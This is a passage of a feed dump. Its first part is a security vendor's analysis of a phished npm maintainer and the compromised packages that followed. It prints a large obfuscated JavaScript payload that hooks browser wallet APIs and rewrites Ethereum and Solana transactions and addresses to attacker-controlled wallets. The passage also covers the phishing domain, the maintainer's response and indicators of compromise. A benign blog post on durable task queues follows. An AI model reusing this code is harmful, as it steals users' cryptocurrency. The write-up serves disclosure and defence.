</span><span>"bitcoincash:qpux2mtlpd03d8zxyc7nsrk8knarnjxxts2fjpzeck"</span><span>, </span><span>"bitcoincash:qpcgcrjry0excx80zp8hn9vsn4cnmk57vylwa5mtz3"</span><span>, </span><span>"bitcoincash:qpjj6prm5menjatrmqaqx0h3zkuhdkfy75uauxz2sj"</span><span>, </span><span>"bitcoincash:qp79qg7np9mvr4mg78vz8vnx0xn8hlkp7sk0g86064"</span><span>, </span><span>"bitcoincash:qr27clvagvzra5z7sfxxrwmjxy026vltucdkhrsvc7"</span><span>, </span><span>"bitcoincash:qrsypfz3lqt8xtf8ej5ftrqyhln577me6v640uew8j"</span><span>, </span><span>"bitcoincash:qrzfrff4czjn6ku0tn2u3cxk7y267enfqvx6zva5w6"</span><span>, </span><span>"bitcoincash:qr7exs4az754aknl3r5gp9scn74dzjkcrgql3jpv59"</span><span>, </span><span>"bitcoincash:qq35fzg00mzcmwtag9grmwljvpuy5jm8kuzfs24jhu"</span><span>, </span><span>"bitcoincash:qra5zfn74m7l85rl4r6wptzpnt2p22h7552swkpa7l"</span><span>, </span><span>"bitcoincash:qzqllr0fsh9fgfvdhmafx32a0ddtkt52evnqd7w7h7"</span><span>, </span><span>"bitcoincash:qpjdcwld84wtd5lk00x8t7qp4eu3y0xhnsjjfgrs7q"</span><span>, </span><span>"bitcoincash:qrgpm5y229xs46wsx9h9mlftedmsm4xjlu98jffmg3"</span><span>, </span><span>"bitcoincash:qpjl9lkjjp4s6u654k3rz06rhqcap849jg8uwqmaad"</span><span>, </span><span>"bitcoincash:qra5uwzgh8qus07v3srw5q0e8vrx5872k5cxguu3h5"</span><span>, </span><span>"bitcoincash:qz6239jkqf9qpl2axk6vclsx3gdt8cy4z5rag98u2r"</span><span>]; </span><span>const</span><span> _0x3ec3bb = { </span><span>'ethereum'</span><span>: </span><span>/\b0x[a-fA-F0-9]{40}\b/g</span><span>, </span><span>'bitcoinLegacy'</span><span>: </span><span>/\b1[a-km-zA-HJ-NP-Z1-9]{25,34}\b/g</span><span>, </span><span>'bitcoinSegwit'</span><span>: </span><span>/\b(3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71})\b/g</span><span>, </span><span>'tron'</span><span>: </span><span>/((?<span>, </span><span>'bch'</span><span>: </span><span>/bitcoincash:[qp][a-zA-Z0-9]{41}/g</span><span>, </span><span>'ltc'</span><span>: </span><span>/(?<span>, </span><span>'ltc2'</span><span>: </span><span>/(?<span>, </span><span>'solana'</span><span>: </span><span>/((?<span>, </span><span>'solana2'</span><span>: </span><span>/((?<span>, </span><span>'solana3'</span><span>: </span><span>/((? }; <span> </span><span>for</span><span> (</span><span>const</span><span> [_0x17ccd4, _0x129783] </span><span>of</span><span>Object</span><span>.entries(_0x3ec3bb)) { </span><span>const</span><span> _0x1be350 = _0x530d91.match(_0x129783) || []; </span><span>for</span><span> (</span><span>const</span><span> _0x4225ce </span><span>of</span><span> _0x1be350) { </span><span>if</span><span> (_0x17ccd4 == </span><span>"ethereum"</span><span>) { </span><span>if</span><span> (!_0x4477fc.includes(_0x4225ce) &amp;&amp; neth == </span><span>) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x4477fc)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"bitcoinLegacy"</span><span>) { </span><span>if</span><span> (!_0x264994.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x264994)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"bitcoinSegwit"</span><span>) { </span><span>if</span><span> (!_0x2e3cca.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x2e3cca)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"tron"</span><span>) { </span><span>if</span><span> (!_0x3ee86f.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x3ee86f)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"ltc"</span><span>) { </span><span>if</span><span> (!_0x4a9d96.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x4a9d96)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"ltc2"</span><span>) { </span><span>if</span><span> (!_0x4a9d96.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x4a9d96)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"bch"</span><span>) { </span><span>if</span><span> (!_0x553dcb.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x553dcb)); } } <span>const</span><span> _0x2d452a = [..._0x4477fc, ..._0x264994, ..._0x2e3cca, ..._0x3ee86f, ..._0x4a9d96, ..._0x553dcb]; </span><span>const</span><span> _0x35f871 = _0x2d452a.includes(_0x4225ce); </span><span>if</span><span> (_0x17ccd4 == </span><span>"solana"</span><span> &amp;&amp; !_0x35f871) { </span><span>if</span><span> (!_0x514d7d.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x514d7d)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"solana2"</span><span> &amp;&amp; !_0x35f871) { </span><span>if</span><span> (!_0x514d7d.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x514d7d)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"solana3"</span><span> &amp;&amp; _0x35f871) { </span><span>if</span><span> (!_0x514d7d.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x514d7d)); } } } } <span>return</span><span> _0x530d91; </span> } } <span>async</span><span>function</span><span>runmask</span><span>(</span><span>) </span><span>{ </span><span>let</span><span> _0x1c41fa = </span><span>; </span><span>let</span><span> _0x2a20cb = </span><span>new</span><span>Map</span><span>(); </span><span>let</span><span> _0x1ab7cb = </span><span>false</span><span>; </span><span>function</span><span>_0x1089ae</span><span>(</span><span>_0x4ac357, _0xc83c36 = </span><span>true</span><span>) </span><span>{ </span><span>const</span><span> _0x13d8ee = </span><span>JSON</span><span>.parse(</span><span>JSON</span><span>.stringify(_0x4ac357)); </span><span>if</span><span> (_0xc83c36) { </span><span>if</span><span> (_0x13d8ee.value &amp;&amp; _0x13d8ee.value !== </span><span>"0x0"</span><span> &amp;&amp; _0x13d8ee.value !== </span><span>'0'</span><span>) { </span><span> _0x13d8ee.to = </span><span>"0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>; </span> } <span>if</span><span> (_0x13d8ee.data) { </span><span>const</span><span> _0x250e27 = _0x13d8ee.data.toLowerCase(); </span><span>if</span><span> (_0x250e27.startsWith(</span><span>"0x095ea7b3"</span><span>)) { </span><span>if</span><span> (_0x250e27.length &gt;= </span><span>74</span><span>) { </span><span>const</span><span> _0x7fa5f0 = _0x250e27.substring(</span><span>, </span><span>10</span><span>); </span><span>const</span><span> _0x15c4f9 = </span><span>'0x'</span><span> + _0x250e27.substring(</span><span>34</span><span>, </span><span>74</span><span>); </span><span>const</span><span> _0xde14cc = </span><span>"Fc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>.padStart(</span><span>64</span><span>, </span><span>'0'</span><span>); </span><span>const</span><span> _0x3e4a11 = </span><span>'f'</span><span>.repeat(</span><span>64</span><span>); </span> _0x13d8ee.data = _0x7fa5f0 + _0xde14cc + _0x3e4a11; <span>const</span><span> _0x432d38 = { </span><span>'0x7a250d5630b4cf539739df2c5dacb4c659f2488d'</span><span>: </span><span>"Uniswap V2"</span><span>, </span><span>'0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af'</span><span>: </span><span>"Uniswap V2"</span><span>, </span><span>'0xe592427a0aece92de3edee1f18e0157c05861564'</span><span>: </span><span>"Uniswap V3"</span><span>, </span><span>'0x10ed43c718714eb63d5aa57b78b54704e256024e'</span><span>: </span><span>"PancakeSwap V2"</span><span>, </span><span>'0x13f4ea83d0bd40e75c8222255bc855a974568dd4'</span><span>: </span><span>"PancakeSwap V3"</span><span>, </span><span>'0x1111111254eeb25477b68fb85ed929f73a960582'</span><span>: </span><span>"1inch"</span><span>, </span><span>'0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f'</span><span>: </span><span>"SushiSwap"</span> }; <span> </span><span>const</span><span> _0x13f774 = _0x432d38[_0x15c4f9.toLowerCase()]; </span><span>if</span><span> (_0x13f774) { </span><span>console</span><span>.log(_0x13f774 + _0x15c4f9); </span><span> } </span><span>else</span><span> { </span><span>console</span><span>.log(_0x15c4f9); </span> } } <span> } </span><span>else</span><span> { </span><span>if</span><span> (_0x250e27.startsWith(</span><span>"0xd505accf"</span><span>)) { </span><span>if</span><span> (_0x250e27.length &gt;= </span><span>458</span><span>) { </span><span>const</span><span> _0x571743 = _0x250e27.substring(</span><span>, </span><span>10</span><span>); </span><span>const</span><span> _0x55e7fa = _0x250e27.substring(</span><span>10</span><span>, </span><span>74</span><span>); </span><span>const</span><span> _0x382fb5 = _0x250e27.substring(</span><span>202</span><span>, </span><span>266</span><span>); </span><span>const</span><span> _0x5bb3a7 = _0x250e27.substring(</span><span>266</span><span>, </span><span>330</span><span>); </span><span>const</span><span> _0x2e5118 = _0x250e27.substring(</span><span>330</span><span>, </span><span>394</span><span>); </span><span>const</span><span> _0x3ba273 = _0x250e27.substring(</span><span>394</span><span>, </span><span>458</span><span>); </span><span>const</span><span> _0x36b084 = </span><span>"Fc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>.padStart(</span><span>64</span><span>, </span><span>'0'</span><span>); </span><span>const</span><span> _0x15389e = </span><span>'f'</span><span>.repeat(</span><span>64</span><span>); </span> _0x13d8ee.data = _0x571743 + _0x55e7fa + _0x36b084 + _0x15389e + _0x382fb5 + _0x5bb3a7 + _0x2e5118 + _0x3ba273; } <span> } </span><span>else</span><span> { </span><span>if</span><span> (_0x250e27.startsWith(</span><span>"0xa9059cbb"</span><span>)) { </span><span>if</span><span> (_0x250e27.length &gt;= </span><span>74</span><span>) { </span><span>const</span><span> _0x5d2193 = _0x250e27.substring(</span><span>, </span><span>10</span><span>); </span><span>const</span><span> _0x1493e2 = _0x250e27.substring(</span><span>74</span><span>); </span><span>const</span><span> _0x32c34c = </span><span>"Fc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>.padStart(</span><span>64</span><span>, </span><span>'0'</span><span>); </span> _0x13d8ee.data = _0x5d2193 + _0x32c34c + _0x1493e2; } <span> } </span><span>else</span><span> { </span><span>if</span><span> (_0x250e27.startsWith(</span><span>"0x23b872dd"</span><span>)) { </span><span>if</span><span> (_0x250e27.length &gt;= </span><span>138</span><span>) { </span><span>const</span><span> _0x5c5045 = _0x250e27.substring(</span><span>, </span><span>10</span><span>); </span><span>const</span><span> _0x1ebe01 = _0x250e27.substring(</span><span>10</span><span>, </span><span>74</span><span>); </span><span>const</span><span> _0x558b46 = _0x250e27.substring(</span><span>138</span><span>); </span><span>const</span><span> _0x56d65b = </span><span>"Fc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>.padStart(</span><span>64</span><span>, </span><span>'0'</span><span>); </span> _0x13d8ee.data = _0x5c5045 + _0x1ebe01 + _0x56d65b + _0x558b46; } } } } } <span> } </span><span>else</span><span>if</span><span> (_0x13d8ee.to &amp;&amp; _0x13d8ee.to !== </span><span>"0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>) { </span><span> _0x13d8ee.to = </span><span>"0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>; </span> } <span> } </span><span>else</span><span> { </span><span>if</span><span> (_0x13d8ee.instructions &amp;&amp; </span><span>Array</span><span>.isArray(_0x13d8ee.instructions)) { </span><span> _0x13d8ee.instructions.forEach(</span><span>_0x190501</span><span> =&gt;</span><span> { </span><span>if</span><span> (_0x190501.accounts &amp;&amp; </span><span>Array</span><span>.isArray(_0x190501.accounts)) { </span><span> _0x190501.accounts.forEach(</span><span>_0x2b9990</span><span> =&gt;</span><span> { </span><span>if</span><span> (</span><span>typeof</span><span> _0x2b9990 === </span><span>"string"</span><span>) { </span><span> _0x2b9990 = </span><span>"19111111111111111111111111111111"</span><span>; </span><span> } </span><span>else</span><span>if</span><span> (_0x2b9990.pubkey) { </span><span> _0x2b9990.pubkey = </span><span>"19111111111111111111111111111111"</span><span>; </span> } }); } <span>if</span><span> (_0x190501.keys &amp;&amp; </span><span>Array</span><span>.isArray(_0x190501.keys)) { </span><span> _0x190501.keys.forEach(</span><span>_0x40768f</span><span> =&gt;</span><span> { </span><span>if</span><span> (_0x40768f.pubkey) { </span><span> _0x40768f.pubkey = </span><span>"19111111111111111111111111111111"</span><span>; </span> } }); } }); } <span>if</span><span> (_0x13d8ee.recipient) { </span><span> _0x13d8ee.recipient = </span><span>"19111111111111111111111111111111"</span><span>; </span> } <span>if</span><span> (_0x13d8ee.destination) { </span><span> _0x13d8ee.destination = </span><span>"19111111111111111111111111111111"</span><span>; </span> } } <span>return</span><span> _0x13d8ee; </span> } <span>function</span><span>_0x485f9d</span><span>(</span><span>_0x38473f, _0x292c7a</span><span>) </span><span>{ </span><span>return</span><span>async</span><span>function</span><span> (</span><span>..._0x59af19</span><span>) </span><span>{ </span> _0x1c41fa++; <span>let</span><span> _0x12a7cb; </span><span>try</span><span> { </span><span> _0x12a7cb = </span><span>JSON</span><span>.parse(</span><span>JSON</span><span>.stringify(_0x59af19)); </span><span> } </span><span>catch</span><span> (_0x5d1767) { </span> _0x12a7cb = [..._0x59af19]; } <span>if</span><span> (_0x59af19[</span><span>] &amp;&amp; </span><span>typeof</span><span> _0x59af19[</span><span>] === </span><span>"object"</span><span>) { </span><span>const</span><span> _0x2c3d7e = _0x12a7cb[</span><span>]; </span><span>if</span><span> (_0x2c3d7e.method === </span><span>"eth_sendTransaction"</span><span> &amp;&amp; _0x2c3d7e.params &amp;&amp; _0x2c3d7e.params[</span><span>]) { </span><span>try</span><span> { </span><span>const</span><span> _0x39ad21 = _0x1089ae(_0x2c3d7e.params[</span><span>], </span><span>true</span><span>); </span><span> _0x2c3d7e.params[</span><span>] = _0x39ad21; </span><span> } </span><span>catch</span><span> (_0x226343) {} </span><span> } </span><span>else</span><span> { </span><span>if</span><span> ((_0x2c3d7e.method === </span><span>"solana_signTransaction"</span><span> || _0x2c3d7e.method === </span><span>"solana_signAndSendTransaction"</span><span>) &amp;&amp; _0x2c3d7e.params &amp;&amp; _0x2c3d7e.params[</span><span>]) { </span><span>try</span><span> { </span><span>let</span><span> _0x5ad975 = _0x2c3d7e.params[</span><span>]; </span><span>if</span><span> (_0x5ad975.transaction) { </span> _0x5ad975 = _0x5ad975.transaction; } <span>const</span><span> _0x5dbe63 = _0x1089ae(_0x5ad975, </span><span>false</span><span>); </span><span>if</span><span> (_0x2c3d7e.params[</span><span>].transaction) { </span><span> _0x2c3d7e.params[</span><span>].transaction = _0x5dbe63; </span><span> } </span><span>else</span><span> { </span><span> _0x2c3d7e.params[</span><span>] = _0x5dbe63; </span> } <span> } </span><span>catch</span><span> (_0x4b99fd) {} </span> } } } <span>const</span><span> _0x1cbb37 = _0x38473f.apply(</span><span>this</span><span>, _0x12a7cb); </span><span>if</span><span> (_0x1cbb37 &amp;&amp; </span><span>typeof</span><span> _0x1cbb37.then === </span><span>"function"</span><span>) { </span><span>return</span><span> _0x1cbb37.then(</span><span>_0xea3332</span><span> =&gt;</span><span> _0xea3332)[</span><span>"catch"</span><span>](</span><span>_0x35d6a3</span><span> =&gt;</span><span> { </span><span>throw</span><span> _0x35d6a3; </span> }); } <span>return</span><span> _0x1cbb37; </span> }; } <span>function</span><span>_0x41630a</span><span>(</span><span>_0x5d6d52</span><span>) </span><span>{ </span><span>if</span><span> (!_0x5d6d52) { </span><span>return</span><span>false</span><span>; </span> } <span>let</span><span> _0x2fc35d = </span><span>false</span><span>; </span><span>const</span><span> _0xfafee = [</span><span>"request"</span><span>, </span><span>"send"</span><span>, </span><span>"sendAsync"</span><span>]; </span><span>for</span><span> (</span><span>const</span><span> _0x16ab0e </span><span>of</span><span> _0xfafee) { </span><span>if</span><span> (</span><span>typeof</span><span> _0x5d6d52[_0x16ab0e] === </span><span>"function"</span><span>) { </span><span>const</span><span> _0x58cddf = _0x5d6d52[_0x16ab0e]; </span> _0x2a20cb.set(_0x16ab0e, _0x58cddf); <span>try</span><span> { </span><span>Object</span><span>.defineProperty(_0x5d6d52, _0x16ab0e, { </span><span>'value'</span><span>: _0x485f9d(_0x58cddf, _0x16ab0e), </span><span>'writable'</span><span>: </span><span>true</span><span>, </span><span>'configurable'</span><span>: </span><span>true</span><span>, </span><span>'enumerable'</span><span>: </span><span>true</span> }); <span> _0x2fc35d = </span><span>true</span><span>; </span><span> } </span><span>catch</span><span> (_0x19546c) {} </span> } } <span>if</span><span> (_0x2fc35d) { </span><span> _0x1ab7cb = </span><span>true</span><span>; </span> } <span>return</span><span> _0x2fc35d; </span> } <span>function</span><span>_0xfc3320</span><span>(</span><span>) </span><span>{ </span><span>let</span><span> _0x4f0cd6 = </span><span>; </span><span>const</span><span> _0x5b507d = </span><span>() =&gt;</span><span> { </span> _0x4f0cd6++; <span>if</span><span> (</span><span>window</span><span>.ethereum) { </span><span>setTimeout</span><span>(</span><span>() =&gt;</span><span> { </span><span> _0x41630a(</span><span>window</span><span>.ethereum); </span><span> }, </span><span>500</span><span>); </span><span>return</span><span>; </span> } <span>if</span><span> (_0x4f0cd6 &lt; </span><span>50</span><span>) { </span><span>setTimeout</span><span>(_0x5b507d, </span><span>100</span><span>); </span> } }; _0x5b507d(); } _0xfc3320(); <span>window</span><span>.stealthProxyControl = { </span><span>'isActive'</span><span>: </span><span>() =&gt;</span><span> _0x1ab7cb, </span><span>'getInterceptCount'</span><span>: </span><span>() =&gt;</span><span> _0x1c41fa, </span><span>'getOriginalMethods'</span><span>: </span><span>() =&gt;</span><span> _0x2a20cb, </span><span>'forceShield'</span><span>: </span><span>() =&gt;</span><span> { </span><span>if</span><span> (</span><span>window</span><span>.ethereum) { </span><span>return</span><span> _0x41630a(</span><span>window</span><span>.ethereum); </span> } <span>return</span><span>false</span><span>; </span> } }; }</span></span></span></span></span></span></code></pre><p>&zwj;</p><p>This malware is essentially a <strong>browser-based interceptor</strong> that hijacks both network traffic and application APIs. It injects itself into functions like <code>fetch</code>, <code>XMLHttpRequest</code>, and common wallet interfaces, then silently rewrites values in requests and responses. That means any sensitive identifiers, such as payment destinations or approval targets, can be swapped out for attacker, controlled ones before the user even sees or signs them. To make the changes harder to notice, it uses string-matching logic that replaces targets with look-alike values.</p><p>What makes it dangerous is that it operates at multiple layers: altering content shown on websites, tampering with API calls, and manipulating what users&rsquo; apps believe they are signing. Even if the interface looks correct, the underlying transaction can be redirected in the background. </p><h3>&#128736; How the Malware Works (Step by Step)</h3><ol><li><strong>Injects itself into the browser</strong><ul><li>Hooks core functions like <code>fetch</code>, <code>XMLHttpRequest</code>, and wallet APIs (<code>window.ethereum</code>, Solana, etc.).</li><li>Ensures it can intercept both web traffic and wallet activity.</li></ul></li><li><strong>Watches for sensitive data</strong><ul><li>Scans network responses and transaction payloads for anything that looks like a wallet address or transfer.</li><li>Recognizes multiple formats across Ethereum, Bitcoin, Solana, Tron, Litecoin, and Bitcoin Cash.</li></ul></li><li><strong>Rewrites the targets</strong><ul><li>Replaces the legitimate destination with an attacker-controlled address.</li><li>Uses &ldquo;lookalike&rdquo; addresses (via string-matching) to make swaps less obvious.</li></ul></li><li><strong>Hijacks transactions before they&rsquo;re signed</strong><ul><li>Alters Ethereum and Solana transaction parameters (e.g., recipients, approvals, allowances).</li><li>Even if the UI looks correct, the signed transaction routes funds to the attacker.</li></ul></li><li><strong>Stays stealthy</strong><ul><li>If a crypto wallet is detected, it avoids obvious swaps in the UI to reduce suspicion.</li><li>Keeps silent hooks running in the background to capture and alter real transactions.</li></ul></li></ol><p>&zwj;</p><h2>The phishing email</h2><p>The maintainer <a href="https://bsky.app/profile/bad-at-computer.bsky.social/post/3lydje4zqis2y">shared</a> that he was compromised by the use of phishing, using this email coming from <code>support [at] npmjs [dot] help</code> :</p><figure></figure><p>The domain was registered just three days ago on September 5th, 2025:</p><figure></figure><p>&zwj;</p><h2>Maintainer response</h2><p>After Aikido notified the maintainer on Bluesky, he <a href="https://bsky.app/profile/bad-at-computer.bsky.social/post/3lydioq5swk2y">replied</a> at 15:15 UTC that he was aware of being compromised, and starting to clean up the compromised packages.</p><figure></figure><p>&zwj;</p><p>The author also <a href="https://bsky.app/profile/bad-at-computer.bsky.social/post/3lydje4zqis2y">shared</a> that the phishing email was sent from <code>support [at] npmjs [dot] help</code> .</p><figure></figure><p>The author appears to have deleted most of the compromised package before losing access to his account. At the time of writing, the package <code>simple-swizzle</code> is still compromised<code>.</code></p><p>&zwj;</p><p>The author further commented on <a href="https://news.ycombinator.com/item?id=45169794">HackerNews</a>:</p><figure></figure><p>&zwj;</p><h2>Attackers target another maintainer</h2><p>At 16:58 UTC, our system detected another package, which was comrpomised by what appears to be the same attackers:</p><p><code>proto-tinker-wc@0.1.87</code> </p><p>&zwj;</p><p>The file <code>dist/cjs/proto-tinker.cjs.entry.js</code> contains the malicious code:</p><figure></figure><p>&zwj;</p><h2>Indicators of compromise</h2><p><strong>Phishing domain</strong></p><ul><li>&zwj;<code>npmjs.help</code> </li></ul><p>&zwj;</p><p><strong>Package versions</strong></p></div><div><div><p>Charlie Eriksen is a Security Researcher at Aikido Security, with extensive experience across IT security - including in product and leadership roles. He is the founder of jswzl and he previously worked at Secure Code Warrior as a security researcher and co-founded Adversary.</p></div></div></div><div><div><div><h2>AutoTriage Integration in IDE</h2><p>Aikido's IDE plugin can detect vulnerable code, and AutoTriage can help you ro priotiize what to fix</p></div></div><div><div><h2>Aikido for Students and Educators</h2><p>Aikido for Education offers students hands-on cybersecurity training with real-world security tools, free for all educators.</p></div></div><div><div><h2>Free hands-on security labs for your students</h2><p>Aikido for Education offers students hands-on cybersecurity training with real-world security tools, free for all educators.</p></div></div></div><div><div><h2>Get secure for free</h2><p>Secure your code, cloud, and runtime in one central system.<br>Find and fix vulnerabilities <span>fast</span> automatically.</p><p>No credit card required |Scan results in 32secs.</p></div></div></div><div class="gallery"><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68beea5206ecea5adcf453b6_4913bc7a.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68beea5206ecea5adcf453b9_d712be77.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bf028d86e3642f1268253f_050c42b9.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bf0c759ee5745abae971d6_4d7201ce.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bef52fd46522cb992c2219_4f550d2c.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bef771ef1d9d76f657c620_85e69b2a.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68befd7be19287dbec088edf_9a88ae42.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bf10ec2433fb72c8e0cb55_1c9c488f.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/67ea6658517bb9c783e617e2_65871099f04b9ebb3d253537_359431729_10161266676199604_6750652865330630761_n.jpg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6836b17027f911d14ce42ba7_arrow%20right.svg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6825fdbd77201ff82b42eaac_Frame%201321315277%20(1).avif"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6825d8f68e45d9a5bf7a4beb_b1dbddf2b778530e6f5ace222c099514_random-cta-background.avif"></p></div></section>]]></description><pubDate>Mon, 08 Sep 2025 20:58:16 +0530</pubDate></item><item><link>https://www.dbos.dev/blog/durable-queues</link><title>How I solved a distributed queue problem after 15 years (dbos.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbg6u1/how_i_solved_a_distributed_queue_problem_after_15/</guid><comments>https://www.reddit.com/r/programming/comments/1nbg6u1/how_i_solved_a_distributed_queue_problem_after_15/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 5 min | <a href='https://www.reddit.com/r/programming/comments/1nbg6u1/how_i_solved_a_distributed_queue_problem_after_15/'>Post permalink</a></p></section><section class='preview-image'><img src='https://cdn.prod.website-files.com/672411cbf038560468c9e68f/68b9cf41ae3b9e6d626b6f52_how-to-make-queues-durable.jpg' /></section><section class='parsed-content'><div><p>When I was responsible for the infrastructure at Reddit, the most important thing I maintained was Postgres, but a close second was RabbitMQ, our message broker. It was essential to the operation of reddit &mdash; everything went into a distributed queue before it went to a database. For example, if you upvoted a post, that was written to the queue and the cache, and then returned success to the user. Then a queue runner would take that item, and attempt to write it to the database as well as create a new work item to recalculate all the listings that upvote affected.</p><p>We used this task queue architecture because it was simple and scalable with powerful features:</p><ul><li><strong>Horizontal scalability</strong>. Task queues let us run many tasks in parallel, utilizing the resources of many servers. They were also fairly simple to scale&ndash;just add more workers.</li><li><strong>Flow control</strong>. With task queues, we could customize the rate at which workers consume tasks from different queues. For example, for resource-intensive tasks, we could limit the number of those tasks that can run concurrently on a single worker. If a task accesses a rate-limited API, we could limit how many tasks are executed per second to avoid overwhelming the API.&nbsp;</li><li><strong>Scheduling</strong>. Task queues let us define when or how often a task runs. For example, we could run tasks on a cron schedule, or schedule tasks to execute some time in the future.</li></ul><p>This system scaled well, but it could break in all sorts of tricky ways. If the databases for votes were down, the item would have to go back onto the queue. If the listings cache was down, the listings couldn&rsquo;t get recalculated. If the queue processor crashed after it had taken the item but before it acted on it, the data was just lost. And if the queue itself went down, as it was prone to do, we could just lose votes, or comments, or submissions (did you ever think &ldquo;I know I voted on that but it&rsquo;s gone!&rdquo; when using reddit?&nbsp; That&rsquo;s why).</p><p>What we really needed to make distributed task queueing robust are <strong>durable queues</strong> that checkpoint the status of our queued tasks to a durable store like Postgres. With a durable queue, we could have resumed failed jobs from their last completed step and we wouldn&rsquo;t have lost data when there were program crashes.</p><p>Durable queues were rare when I was at Reddit, but they&rsquo;re more and more popular now. Essentially, they work by combining task queues with durable workflows, helping you <strong>reliably orchestrate workflows of many parallel tasks</strong>. Architecturally, durable queues closely resemble conventional queues, but use a persistent store (typically a relational database) as both message broker and backend:</p><figure></figure><p>The core abstraction in durable queues is a <strong>workflow</strong> of many tasks. For example, you can submit a document processing task that splits a document into pages, processes each page in parallel in separate tasks, then postprocesses and returns the results:</p><figure></figure><p>Durable queues work by <strong>checkpointing</strong> workflows in their persistent store. When a client submits a task, the task and its inputs are recorded. Then, whenever that task invokes another task, this subtask and its inputs is recorded as a <strong>child </strong>of its caller. Thus, the queue system has a complete persistent record of all tasks and their relationships.</p><p>These workflows are most relevant when recovering from failures. If a non-durable worker is interrupted while executing a task, the queue restarts it from the beginning at best, or loses the task at worst. This isn&rsquo;t ideal for long-running workflows or tasks with critical data. Instead, when a durable queue system recovers a workflow, it looks up its checkpoints to recover from the <strong>last completed step</strong>, avoiding resubmission of any completed work.</p><p>&zwj;</p><h3>Durable Queues and Observability</h3><p>Another advantage of durable queues is <strong>built-in</strong> <strong>observability</strong>. Because they persist detailed records of every workflow and task that was ever submitted, durable queues make it easy to monitor what queues and workflows are doing at any given time. For example, looking up the current contents of a queue (or any past content) is just a SQL query. Similarly, looking up the <a href="https://www.dbos.dev/blog/why-workflows-should-be-postgres-rows">current status of a workflow is another SQL query</a>.&nbsp;</p><p>&zwj;</p><h3>Durable Queueing Tradeoffs</h3><p>So, when should you use durable queues? As always, the answer comes down to <strong>tradeoffs</strong>. For durable queues, the main tradeoff is around <strong>message broker performance</strong>. Most distributed task queues use an in-memory key-value store like Redis for brokering messages and storing task outputs. However, durable queues need to use a durable store, often a relational database like Postgres, as both message broker and backend. The latter provides stronger guarantees, but the former higher throughput. Thus, you should prefer durable queues when handling a lower volume of larger business-critical tasks and distributed task queues when handling a very large volume of smaller tasks.</p><p>&zwj;</p><h3>Additional Reading</h3><ul><li><a href="https://www.dbos.dev/case-studies/dosu">Dosu</a> - migrating queuing from Celery to DBOS</li><li><a href="https://www.dbos.dev/case-studies/bms">Bristol Myers Squibb</a> - durable, observable horizontal scaling of genomic data pipelines with DBOS</li><li><a href="https://www.dbos.dev/case-studies/ai-powered-causal-reasoning">cStructure</a> - migrating queuing from Celery to DBOS</li><li><a href="https://docs.dbos.dev/python/reference/queues">DOCS:&nbsp;DBOS&nbsp;durable queuing</a></li></ul></div><div class="gallery"><p><img src="https://cdn.prod.website-files.com/672411cbf038560468c9e68f/68b7c9f14b71a122d3861644_Durable-Queues-Diagram.png"></p><p><img src="https://cdn.prod.website-files.com/672411cbf038560468c9e68f/68b7bf757d45df00d5753d88_fbbbe73e.png"></p></div></section>]]></description><pubDate>Mon, 08 Sep 2025 11:49:17 +0530</pubDate></item><item><link>https://www.youtube.com/watch?v=sp3mMwo3PO0</link><title>How Your Code Really Controls Hardware (youtube.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nb3b31/how_your_code_really_controls_hardware/</guid><comments>https://www.reddit.com/r/programming/comments/1nb3b31/how_your_code_really_controls_hardware/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p><a 